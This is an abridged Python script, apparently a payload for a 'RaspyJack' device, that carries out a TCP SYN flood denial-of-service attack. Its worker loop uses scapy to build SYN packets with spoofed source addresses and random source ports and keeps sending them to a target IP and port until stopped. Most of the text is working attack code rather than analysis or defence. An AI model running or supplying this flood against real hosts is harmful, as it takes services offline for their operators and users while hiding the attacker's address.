#!/usr/bin/env python3
"""
RaspyJack *payload* – **DoS Attack: TCP SYN Flood**
====================================================
A classic Denial of Service (DoS) attack that sends a high volume of
TCP SYN packets to a target IP and port. The source IP address of the
packets is spoofed.

This can overwhelm the target's connection state table, preventing
...
def syn_flood_worker():
    ...
    while not attack_stop_event.is_set():
        ...
        p = IP(src=spoofed_ip, dst=TARGET_IP) / TCP(sport=RandShort(), dport=TARGET_PORT, flags="S")
        send(p, verbose=0)
        packet_count += 1
        time.sleep(0.01)
